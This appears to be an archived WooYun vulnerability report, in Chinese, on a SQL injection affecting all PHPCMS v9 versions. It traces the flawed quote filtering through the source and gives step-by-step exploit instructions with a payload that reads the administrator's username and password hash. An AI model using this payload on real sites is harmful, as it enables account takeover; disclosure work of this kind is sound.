@@ -1,0 +1,334 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHPCMS全版本通杀SQL注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHPCMS全版本通杀SQL注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-02-11 10:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-11：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-14：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-21：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-03：	细节向普通白帽子公开<br/>
+									2014-03-23：	细节向实习白帽子公开<br/>
+									2014-05-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">上次你们太不给力了,这次再来个通杀v9的SQL注入,包括最新v9.5.3版本</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#漏洞产生<br />
+<br />
+总的来说，是因为你们修复不完善，并没有理解到这个SQL注入的真正原因,同时 补丁后 并没有进行相应的测试 因而可绕过补丁 继续注入...<br />
+<br />
+<br />
+<br />
+#漏洞分析<br />
+<br />
+首先看下面的代码<br />
+<br />
+/phpcms/modules/member/content.php 202行 edit函数<br />
+<br />
+</p><pre><code>public function edit() {<br />
+	$_username = $this-&gt;memberinfo[&#039;username&#039;];<br />
+	if(isset($_POST[&#039;dosubmit&#039;])) {<br />
+		$catid = $_POST[&#039;info&#039;][&#039;catid&#039;] = intval($_POST[&#039;info&#039;][&#039;catid&#039;]);<br />
+		$siteids = getcache(&#039;category_content&#039;, &#039;commons&#039;);<br />
+		$siteid = $siteids[$catid];<br />
+		$CATEGORYS = getcache(&#039;category_content_&#039;.$siteid, &#039;commons&#039;);<br />
+		$category = $CATEGORYS[$catid];<br />
+		if($category[&#039;type&#039;]==0) {//审核状态时，点编辑 再提交，进入if分支<br />
+			$id = intval($_POST[&#039;id&#039;]);<br />
+			$catid = $_POST[&#039;info&#039;][&#039;catid&#039;] = intval($_POST[&#039;info&#039;][&#039;catid&#039;]);<br />
+			$this-&gt;content_db = pc_base::load_model(&#039;content_model&#039;);<br />
+			$modelid = $category[&#039;modelid&#039;];<br />
+			$this-&gt;content_db-&gt;set_model($modelid);<br />
+			//判断会员组投稿是否需要审核<br />
+			$memberinfo = $this-&gt;memberinfo;<br />
+			$grouplist = getcache(&#039;grouplist&#039;);<br />
+			$setting = string2array($category[&#039;setting&#039;]);<br />
+			if(!$grouplist[$memberinfo[&#039;groupid&#039;]][&#039;allowpostverify&#039;] || $setting[&#039;workflowid&#039;]) {<br />
+				$_POST[&#039;info&#039;][&#039;status&#039;] = 1;<br />
+			}<br />
+			$info = array();<br />
+			foreach($_POST[&#039;info&#039;] as $_k=&gt;$_v) {<br />
+				if(in_array($_k, $fields)) $_POST[&#039;info&#039;][$_k] = new_html_special_chars(trim_script($_v));<br />
+			}<br />
+<br />
+			$_POST[&#039;linkurl&#039;] = str_replace(array(&#039;&quot;&#039;,&#039;(&#039;,&#039;)&#039;,&quot;,&quot;,&#039; &#039;),&#039;&#039;,new_html_special_chars($_POST[&#039;linkurl&#039;]));<br />
+			//exit(print_r($_POST[&#039;info&#039;]));<br />
+			$this-&gt;content_db-&gt;edit_content($_POST[&#039;info&#039;],$id);<br />
+			$forward = $_POST[&#039;forward&#039;];<br />
+			showmessage(L(&#039;update_success&#039;),$forward);<br />
+		}<br />
+	} else {<br />
+		//...<br />
+}</code></pre><p class='detail'><br />
+<br />
+229行<br />
+<br />
+</p><pre><code>$this-&gt;content_db-&gt;edit_content($_POST[&#039;info&#039;],$id);</code></pre><p class='detail'><br />
+<br />
+其中 $_POST[&#039;info&#039;] 参数是一个数组，其内容是在线投稿的各项内容，如图所示<br />
+<br />
+</p><p class="detail"><a href="../images/13151141c6a5c57cb51b83615716a5a29515f93a.jpg" target="_blank"><img src="../images/13151141c6a5c57cb51b83615716a5a29515f93a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+好了，接下来我们看看这些数据都经过了怎样的处理...<br />
+<br />
+跟上edit_content函数<br />
+<br />
+ /phpcms/model/content_model.class.php 第234行开始<br />
+<br />
+</p><pre><code>public function edit_content($data,$id) {<br />
+		$model_tablename = $this-&gt;model_tablename;<br />
+		//前台权限判断<br />
+		if(!defined(&#039;IN_ADMIN&#039;)) {<br />
+			$_username = param::get_cookie(&#039;_username&#039;);<br />
+			$us = $this-&gt;get_one(array(&#039;id&#039;=&gt;$id,&#039;username&#039;=&gt;$_username));<br />
+			if(!$us) return false;<br />
+		}<br />
+<br />
+		$this-&gt;search_db = pc_base::load_model(&#039;search_model&#039;);<br />
+<br />
+		require_once CACHE_MODEL_PATH.&#039;content_input.class.php&#039;;<br />
+        require_once CACHE_MODEL_PATH.&#039;content_update.class.php&#039;;<br />
+		$content_input = new content_input($this-&gt;modelid);<br />
+		$inputinfo = $content_input-&gt;get($data);//跟进此函数<br />
+		// /caches/caches_model/caches_data/content_input.class.php get函数<br />
+<br />
+		$systeminfo = $inputinfo[&#039;system&#039;];</code></pre><p class='detail'><br />
+<br />
+第248行，我们可以看到 $_POST[&#039;info&#039;] 数组进入了 get 函数，继续跟进<br />
+<br />
+/caches/caches_model/caches_data/content_input.class.php 第55行开始<br />
+<br />
+</p><pre><code>if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);<br />
+$MODEL = getcache(&#039;model&#039;, &#039;commons&#039;);<br />
+$this-&gt;db-&gt;table_name = $this-&gt;fields[$field][&#039;issystem&#039;] ? $this-&gt;db_pre.$MODEL[$this-&gt;modelid][&#039;tablename&#039;] : $this-&gt;db_pre.$MODEL[$this-&gt;modelid][&#039;tablename&#039;].&#039;_data&#039;;<br />
+if($this-&gt;fields[$field][&#039;isunique&#039;] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != &#039;edit&#039;) showmessage($name.L(&#039;the_value_must_not_repeat&#039;));<br />
+$func = $this-&gt;fields[$field][&#039;formtype&#039;];<br />
+if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);//这里是关键,后面慢慢说明<br />
+if($this-&gt;fields[$field][&#039;issystem&#039;]) {<br />
+	$info[&#039;system&#039;][$field] = $value;<br />
+} else {<br />
+	$info[&#039;model&#039;][$field] = $value;<br />
+}</code></pre><p class='detail'><br />
+<br />
+我们重点关注这里是怎么处理的<br />
+<br />
+</p><pre><code>if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);</code></pre><p class='detail'><br />
+<br />
+为了方便看清楚程序在这里究竟是怎样处理的,我们在这行代码前面加入以下调试代码，看看都经过了哪些函数的处理...<br />
+<br />
+</p><pre><code>if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);<br />
+$MODEL = getcache(&#039;model&#039;, &#039;commons&#039;);<br />
+$this-&gt;db-&gt;table_name = $this-&gt;fields[$field][&#039;issystem&#039;] ? $this-&gt;db_pre.$MODEL[$this-&gt;modelid][&#039;tablename&#039;] : $this-&gt;db_pre.$MODEL[$this-&gt;modelid][&#039;tablename&#039;].&#039;_data&#039;;<br />
+if($this-&gt;fields[$field][&#039;isunique&#039;] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != &#039;edit&#039;) showmessage($name.L(&#039;the_value_must_not_repeat&#039;));<br />
+$func = $this-&gt;fields[$field][&#039;formtype&#039;];<br />
+echo &quot;&lt;br&gt;Function :--&gt;&quot;.$func.&quot;&lt;--&lt;br&gt;&quot;;//这是添加的调试代码<br />
+if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);//这里是关键,后面慢慢说明<br />
+if($this-&gt;fields[$field][&#039;issystem&#039;]) {<br />
+	$info[&#039;system&#039;][$field] = $value;<br />
+} else {<br />
+	$info[&#039;model&#039;][$field] = $value;<br />
+}</code></pre><p class='detail'><br />
+<br />
+编辑投稿内容，提交<br />
+<br />
+</p><p class="detail"><a href="../images/131532303ae1c3397e24503b02ec3954e42be818.jpg" target="_blank"><img src="../images/131532303ae1c3397e24503b02ec3954e42be818.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+看见了吧，我们提交的内容经过了如下几个函数：catid title keyword copyform textarea editor image islink box<br />
+<br />
+经过分析后，我们重点关注image函数，继续跟上<br />
+<br />
+/caches/caches_model/caches_data/content_input.class.php 第102行 image函数<br />
+<br />
+</p><pre><code>function image($field, $value) {<br />
+    $value = str_replace(array(&quot;&#039;&quot;,&#039;&quot;&#039;,&#039;(&#039;,&#039;)&#039;),&#039;&#039;,$value);<br />
+    return trim($value);<br />
+}</code></pre><p class='detail'><br />
+<br />
+过滤了&quot;&#039;&quot;、&quot;(&quot;、&quot;)&quot;,但是呢 我们知道当开启了GPC的时候，单引号会被转义 &#039;--&gt;\&#039;<br />
+<br />
+明白了吧? image函数过滤了单引号，假设我们提交的数据恰巧经过了image函数,则单引号被过滤了，留下&quot;\&quot;，那么这个&quot;\&quot;将会吃掉一个单引号,造成注入<br />
+<br />
+#3 漏洞Poc<br />
+<br />
+条件：后台开启投稿，并要求审核<br />
+<br />
+step1 在会员中心随便投一篇文章，提交<br />
+<br />
+step2 点击编辑，如下<br />
+<br />
+</p><p class="detail"><a href="../images/1110220363c488a27c6935f1f07672e358a1502c.jpg" target="_blank"><img src="../images/1110220363c488a27c6935f1f07672e358a1502c.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+step3 在缩略图栏填入 http://www.vulns.org/sql.jpg&#039;，如图<br />
+<br />
+</p><p class="detail"><a href="../images/1110244162d450c6a6efaa9cf2679b9a48e19f62.jpg" target="_blank"><img src="../images/1110244162d450c6a6efaa9cf2679b9a48e19f62.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+提交后，报错了...<br />
+<br />
+</p><p class="detail"><a href="../images/11102656897f301d21b46a22bc4fa091266adba5.jpg" target="_blank"><img src="../images/11102656897f301d21b46a22bc4fa091266adba5.jpg" alt="22.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+# 漏洞最终利用Exp<br />
+<br />
+在缩略图栏填入：http://www.vulns.org/sql.jpg&#039;<br />
+<br />
+点击提交，采用Tamper data抓包修改，将info[islink]修改为<br />
+<br />
+</p><pre><code>,title=(select concat(username,password) from v9_admin where userid=1) -- felixk3y</code></pre><p class='detail'><br />
+<br />
+点击确定，再点编辑 即可读取管理员账号 密码，如图</p><p class="detail"><a href="../images/11110022c07aae832a18e6b752fab09bc3f34a0e.jpg" target="_blank"><img src="../images/11110022c07aae832a18e6b752fab09bc3f34a0e.jpg" alt="exp.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/11110022c07aae832a18e6b752fab09bc3f34a0e.jpg" target="_blank"><img src="../images/11110022c07aae832a18e6b752fab09bc3f34a0e.jpg" alt="exp.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">必须给力啊. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050636" title="PHPCMS全版本通杀SQL注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2014-02-11 11:48</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50636";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
